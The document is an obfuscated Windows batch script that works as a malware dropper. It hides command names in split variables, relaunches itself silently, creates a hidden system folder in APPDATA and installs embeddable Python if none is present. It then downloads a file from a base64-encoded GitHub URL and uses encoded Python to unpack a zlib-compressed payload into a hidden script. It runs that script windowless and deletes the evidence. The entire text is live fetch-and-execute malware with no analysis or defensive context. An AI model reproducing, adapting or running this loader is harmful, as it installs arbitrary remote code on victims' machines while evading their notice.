@echo off
set "qXfxG=cu"
set "qEfvr=rl"
set "qVYBd=ta"
set "qgOEj=r"
set "qxroP=py"
set "qnoyL=thon"
set "qCiUf=wh"
set "qKFyP=ere"
set "qpTMK=mk"
set "qevzc=dir"
set "qoXMh=at"
set "qCAoI=trib"
set "qbgmB=st"
set "qAoAd=art"
set "qENfo=de"
set "qTxvp=l"
set "qENkU=time"
set "qhtqw=out"
set "qwVzS=pi"
set "qYQDG=ng"
set "qcpaa=cm"
set "qVEya=d"
set "qiAbF=py"
set "qPXZl= -3"
@if /i "%~1"=="-updx" goto r1
@if /i "%~1"=="r1" goto r1
@if not "%~1"=="" goto %~1
@%qbgmB%%qAoAd% /b "" "%~f0" r1 >nul 2>&1
goto n1

:r1
set "vicGH=%APPDATA%\vicGH"
set "wFKaf=%TEMP%\wIhWM.log"
if not exist "%vicGH%" %qpTMK%%qevzc% "%vicGH%" >nul 2>&1
%qoXMh%%qCAoI% +h +s "%vicGH%" >nul 2>&1
if exist "%vicGH%\yAzEz" rmdir /s /q "%vicGH%\yAzEz" >nul 2>&1
%qpTMK%%qevzc% "%vicGH%\yAzEz" >nul 2>&1
if exist "%vicGH%\zZsHc.zip" %qENfo%%qTxvp% /f /q "%vicGH%\zZsHc.zip" >nul 2>&1
set "gKdEe1=aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNv"
set "gKdEe2=bnRlbnQuY29tL2FzZGFzZGFzZGFzc2Fk"
set "gKdEe3=c2Evc2Fkc2FzZC9tYWluL3VwZC5kYXQ="
set "vbDVD=%gKdEe1%%gKdEe2%%gKdEe3%"
set "vOeyx="
set "vgbEK="
%qiAbF%%qPXZl% --version >nul 2>&1 && (set "vOeyx=py" & %qCiUf%%qKFyP% pyw >nul 2>&1 && set "vgbEK=pyw")
if not defined vOeyx (
%qxroP%%qnoyL% --version >nul 2>&1 && (set "vOeyx=%qxroP%%qnoyL%" & %qCiUf%%qKFyP% %qxroP%%qnoyL%w >nul 2>&1 && set "vgbEK=%qxroP%%qnoyL%w")
)
goto r2

:n1
goto n2

:r2
if not defined vOeyx (
set "hTenI1=https:/"
set "hTenI2=/www.p"
set "hTenI3=ython.o"
set "hTenI4=rg/ftp/p"
set "hTenI5=ython/3"
set "hTenI6=.11.9/py"
set "hTenI7=thon-3."
set "hTenI8=11.9-emb"
set "hTenI9=ed-amd6"
set "hTenI10=4.zip"
set "uFZmd=%hTenI1%%hTenI2%%hTenI3%%hTenI4%%hTenI5%%hTenI6%%hTenI7%%hTenI8%%hTenI9%%hTenI10%"
%qXfxG%%qEfvr% -s -L -o "%vicGH%\zZsHc.zip" "%uFZmd%" >nul 2>&1
%qVYBd%%qgOEj% -xf "%vicGH%\zZsHc.zip" -C "%vicGH%\yAzEz" >nul 2>&1
if exist "%vicGH%\yAzEz\%qxroP%%qnoyL%.exe" set "vOeyx=%vicGH%\yAzEz\%qxroP%%qnoyL%.exe"
if exist "%vicGH%\yAzEz\%qxroP%%qnoyL%w.exe" set "vgbEK=%vicGH%\yAzEz\%qxroP%%qnoyL%w.exe"
)
if not defined vOeyx (
exit /b
)
goto r3

:n2
goto n3

:r3
"%vOeyx%" -c "import base64;print(base64.b64decode('%vbDVD%').decode())" > "%vicGH%\vNTbL.tmp" 2>nul
for /f "usebackq delims=" %%u in ("%vicGH%\vNTbL.tmp") do set "vjGtF=%%u"
%qENfo%%qTxvp% /q "%vicGH%\vNTbL.tmp" >nul 2>&1
%qXfxG%%qEfvr% -s -L -o "%vicGH%\upd.dat" "%vjGtF%" >nul 2>&1
goto r4

:n3
goto n4

:r4
"%vOeyx%" -c "import base64;exec(base64.b64decode('aW1wb3J0IGJhc2U2NCx6bGliLG9zO3A9b3MucGF0aC5leHBhbmR2YXJzKHInJXZpY0dIJVx1cGQuZGF0Jyk7ZD1vcGVuKHAsJ3JiJykucmVhZCgpO2k9ZC5maW5kKGInLS0tVVBELS0tJyk7Yj1kW2krOTpdLnJlcGxhY2UoYidccicsYicnKS5yZXBsYWNlKGInXG4nLGInJyk7bz1vcy5wYXRoLmV4cGFuZHZhcnMocicldmljR0glXHZYY2pGLnB5Jyk7b3BlbihvLCd3JyxlbmNvZGluZz0ndXRmLTgnKS53cml0ZSh6bGliLmRlY29tcHJlc3MoYmFzZTY0LmI2NGRlY29kZShiKSkuZGVjb2RlKCd1dGYtOCcpKQ=='))"
%qoXMh%%qCAoI% +h +s "%vicGH%\vXcjF.py" >nul 2>&1
goto r5

:n4
goto n5

:r5
if defined vgbEK (
%qbgmB%%qAoAd% /b "" "%vgbEK%" "%vicGH%\vXcjF.py" >nul 2>&1
) else (
%qbgmB%%qAoAd% /min "" "%vOeyx%" "%vicGH%\vXcjF.py"
)
%qENkU%%qhtqw% /t 5 >nul
%qENfo%%qTxvp% /q "%vicGH%\upd.dat" >nul 2>&1
exit /b

:n5
exit /b
